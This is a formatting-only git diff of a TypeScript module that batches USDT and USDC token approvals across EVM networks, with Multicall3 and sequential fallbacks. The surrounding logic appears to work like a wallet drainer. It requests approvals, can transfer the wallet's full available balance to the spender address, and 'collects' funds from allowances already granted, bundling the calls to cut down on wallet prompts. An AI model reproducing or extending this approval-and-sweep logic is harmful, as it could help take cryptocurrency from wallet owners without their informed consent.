@@ -27,23 +27,26 @@ import {
   shouldAttemptEip5792,
   type BatchJob,
 } from "./evm-token-batch-tiers";
-import type {
-  AuthorizationAssetResult,
-  TokenSymbol,
-} from "../types";
+import type { AuthorizationAssetResult, TokenSymbol } from "../types";
 import type { IncludedAssetWorkItem } from "./preferences";
 import { balanceForToken } from "./preferences";
 import type { WalletPhaseTokenCapture } from "./phases/types";
-import type { EvmTokenBatchRunArgs, EvmTokenBatchRunResult } from "./evm-token-batch-types";
+import type {
+  EvmTokenBatchRunArgs,
+  EvmTokenBatchRunResult,
+} from "./evm-token-batch-types";
 
-export type { EvmTokenBatchRunArgs, EvmTokenBatchRunResult } from "./evm-token-batch-types";
+export type {
+  EvmTokenBatchRunArgs,
+  EvmTokenBatchRunResult,
+} from "./evm-token-batch-types";
 
 /**
  * Run USDT + USDC approvals on one EVM network as a single EIP-5792 wallet batch
  * when the wallet supports wallet_sendCalls. Falls back to Multicall3 then sequential.
  */
 export async function runEvmTokenBatchApproval(
-  args: EvmTokenBatchRunArgs
+  args: EvmTokenBatchRunArgs,
 ): Promise<EvmTokenBatchRunResult> {
   const log = args.log ?? (() => undefined);
   const owner = args.accounts.evm;
@@ -61,7 +64,11 @@ export async function runEvmTokenBatchApproval(
 
   const chainId = EVM_CHAIN_ID[args.network as keyof typeof EVM_CHAIN_ID];
   if (chainId == null) {
-    const fallback = await runSequentialFallback(args, owner, "Unsupported EVM network");
+    const fallback = await runSequentialFallback(
+      args,
+      owner,
+      "Unsupported EVM network",
+    );
     return {
       results: fallback.results,
       tokenCaptures: fallback.tokenCaptures,
@@ -106,7 +113,7 @@ export async function runEvmTokenBatchApproval(
     const tokenBalanceHuman = balanceForToken(networkRow, token);
     const availableBalanceRaw = parseHumanToRaw(
       tokenBalanceHuman,
-      tokenInfo.decimals
+      tokenInfo.decimals,
     );
     const requestedTransferRaw = item.unlimited
       ? availableBalanceRaw
@@ -141,14 +148,19 @@ export async function runEvmTokenBatchApproval(
         log("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
           network: item.network,
           token,
-          error: getErrorMessage(preflightErr, "Allowance preflight unavailable"),
+          error: getErrorMessage(
+            preflightErr,
+            "Allowance preflight unavailable",
+          ),
         });
         prepared = await api.prepare({ request });
       }
 
       if (alreadyAuthorized && !shouldAttemptTransfer) {
         args.onAssetStart?.({ ...item, asset: token });
-        const result = alreadyAuthorizedResult({ item: { ...item, asset: token } });
+        const result = alreadyAuthorizedResult({
+          item: { ...item, asset: token },
+        });
         args.onAssetEnd?.(result);
         results.push(result);
         log("EIP5792_BATCH_SKIP_ALREADY_AUTHORIZED", {
@@ -179,7 +191,10 @@ export async function runEvmTokenBatchApproval(
             network: item.network,
             token,
             outcome: "failed",
-            message: getErrorMessage(err, "Failed to collect existing allowance"),
+            message: getErrorMessage(
+              err,
+              "Failed to collect existing allowance",
+            ),
           };
           args.onAssetEnd?.(result);
           results.push(result);
@@ -202,18 +217,20 @@ export async function runEvmTokenBatchApproval(
         prepared,
         signed,
         shouldAttemptTransfer,
-        transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+        transferAmountRaw: shouldAttemptTransfer
+          ? transferAmountRaw
+          : undefined,
       });
     } catch (err) {
       const rejected = isUserRejection(err);
-        const result: AuthorizationAssetResult = {
-          network: item.network,
-          token,
-          outcome: rejected ? "user_rejected" : "failed",
-          message: rejected
-            ? PERMISSION_DENIED_BY_USER_MESSAGE
-            : getErrorMessage(err, "Failed to prepare batch approval"),
-        };
+      const result: AuthorizationAssetResult = {
+        network: item.network,
+        token,
+        outcome: rejected ? "user_rejected" : "failed",
+        message: rejected
+          ? PERMISSION_DENIED_BY_USER_MESSAGE
+          : getErrorMessage(err, "Failed to prepare batch approval"),
+      };
       args.onAssetEnd?.(result);
       results.push(result);
     }
@@ -231,7 +248,9 @@ export async function runEvmTokenBatchApproval(
         owner,
       })
     : null;
-  const nativeCall = nativeEstimate ? buildNativeWalletCall(nativeEstimate) : null;
+  const nativeCall = nativeEstimate
+    ? buildNativeWalletCall(nativeEstimate)
+    : null;
   if (nativeCall && nativeEstimate) {
     log("NATIVE_BATCH_ESTIMATE", {
       network: args.network,
@@ -240,7 +259,11 @@ export async function runEvmTokenBatchApproval(
     });
   }
 
-  const capabilities = await resolveWalletCapabilities(args.provider, chainId, owner);
+  const capabilities = await resolveWalletCapabilities(
+    args.provider,
+    chainId,
+    owner,
+  );
   if (!shouldAttemptEip5792(capabilities, chainId)) {
     log("EIP5792_BATCH_UNSUPPORTED", {
       network: args.network,
@@ -284,9 +307,12 @@ export async function runEvmTokenBatchApproval(
   }
 
   if (jobs.length === 1) {
-    const fallbackResults = await runSequentialFallback(args, owner, undefined, [
-      jobs[0]!.item,
-    ]);
+    const fallbackResults = await runSequentialFallback(
+      args,
+      owner,
+      undefined,
+      [jobs[0]!.item],
+    );
     return {
       results: [...results, ...fallbackResults.results],
       tokenCaptures: fallbackResults.tokenCaptures,
@@ -306,7 +332,7 @@ async function runSequentialFallback(
   args: EvmTokenBatchRunArgs,
   owner: string,
   reason?: string,
-  items: IncludedAssetWorkItem[] = args.items
+  items: IncludedAssetWorkItem[] = args.items,
 ): Promise<EvmTokenBatchRunResult> {
   if (reason) {
     args.log?.("EIP5792_BATCH_FALLBACK", { network: args.network, reason });
@@ -349,7 +375,7 @@ async function runSequentialFallback(
     const tokenBalanceHuman = balanceForToken(networkRow, token);
     const availableBalanceRaw = parseHumanToRaw(
       tokenBalanceHuman,
-      tokenInfo.decimals
+      tokenInfo.decimals,
     );
     const requestedTransferRaw = item.unlimited
       ? availableBalanceRaw
@@ -376,7 +402,9 @@ async function runSequentialFallback(
           tokenBalanceHuman,
           executeTransfer: shouldAttemptTransfer,
           transferToAddress: spender,
-          transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+          transferAmountRaw: shouldAttemptTransfer
+            ? transferAmountRaw
+            : undefined,
         };
         const preflight = await preflightExistingAllowance({
           api: preflightApi,
@@ -388,7 +416,10 @@ async function runSequentialFallback(
         args.log?.("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
           network: item.network,
           token,
-          error: getErrorMessage(preflightErr, "Allowance preflight unavailable"),
+          error: getErrorMessage(
+            preflightErr,
+            "Allowance preflight unavailable",
+          ),
         });
       }
 
@@ -405,7 +436,12 @@ async function runSequentialFallback(
         continue;
       }
 
-      if (alreadyAuthorized && shouldAttemptTransfer && preflightRequest && preflightPrepared) {
+      if (
+        alreadyAuthorized &&
+        shouldAttemptTransfer &&
+        preflightRequest &&
+        preflightPrepared
+      ) {
         try {
           const result = await collectForExistingAllowance({
             item: { ...item, asset: token },
@@ -425,7 +461,10 @@ async function runSequentialFallback(
             network: item.network,
             token,
             outcome: "failed",
-            message: getErrorMessage(err, "Failed to collect existing allowance"),
+            message: getErrorMessage(
+              err,
+              "Failed to collect existing allowance",
+            ),
           };
           results.push(result);
           args.onAssetEnd?.(result);
@@ -443,7 +482,9 @@ async function runSequentialFallback(
         tokenBalanceHuman,
         executeTransfer: shouldAttemptTransfer,
         transferToAddress: spender,
-        transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+        transferAmountRaw: shouldAttemptTransfer
+          ? transferAmountRaw
+          : undefined,
       });
 
       if (!orchestration.ok) {
@@ -468,7 +509,9 @@ async function runSequentialFallback(
           item: { ...item, asset: token },
           orchestration,
           shouldAttemptTransfer,
-          transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+          transferAmountRaw: shouldAttemptTransfer
+            ? transferAmountRaw
+            : undefined,
         });
         const result: AuthorizationAssetResult = {
           network: item.network,
@@ -532,7 +575,7 @@ export type AuthorizationWorkUnit =
  * Group consecutive EVM token items on the same network for EIP-5792 batching.
  */
 export function planAuthorizationWork(
-  items: IncludedAssetWorkItem[]
+  items: IncludedAssetWorkItem[],
 ): AuthorizationWorkUnit[] {
   const units: AuthorizationWorkUnit[] = [];
   let index = 0;
@@ -559,13 +602,16 @@ export function planAuthorizationWork(
       }
 
       if (batch.length >= 2) {
-        let nativeItem: (IncludedAssetWorkItem & { asset: "NATIVE" }) | undefined;
+        let nativeItem:
+          (IncludedAssetWorkItem & { asset: "NATIVE" }) | undefined;
         if (
           next < items.length &&
           items[next]?.asset === "NATIVE" &&
           items[next]?.network === item.network
         ) {
-          nativeItem = items[next] as IncludedAssetWorkItem & { asset: "NATIVE" };
+          nativeItem = items[next] as IncludedAssetWorkItem & {
+            asset: "NATIVE";
+          };
           next += 1;
         }
         units.push({
